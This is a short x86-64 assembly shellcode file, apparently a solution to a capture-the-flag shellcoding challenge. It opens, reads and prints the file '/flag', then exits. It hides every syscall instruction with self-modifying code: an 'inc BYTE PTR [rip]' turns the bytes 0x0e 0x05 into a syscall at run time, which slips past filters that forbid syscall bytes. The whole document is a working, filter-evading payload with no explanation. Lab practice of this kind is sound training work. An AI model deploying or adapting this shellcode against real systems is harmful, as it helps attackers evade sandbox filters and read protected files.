.intel_syntax noprefix
_start:

    # nop for 0x1000 times first 
    mov rax, 2
    xor rsi, rsi
    xor rdx, rdx
    mov rbx, 0x67616c662f
    push rbx
    mov rdi, rsp
    inc BYTE PTR [rip] 
    .byte 0x0e
    .byte 0x05

    mov rdi, rax
    xor rax, rax
    mov rsi, rsp
    mov rdx, 100
    inc BYTE PTR [rip] 
    .byte 0x0e
    .byte 0x05
    
    mov rax, 1
    mov rdi, 1
    inc BYTE PTR [rip]
    .byte 0x0e
    .byte 0x05 
    
    mov rax, 60
    inc BYTE PTR [rip] 
    .byte 0x0e
    .byte 0x05
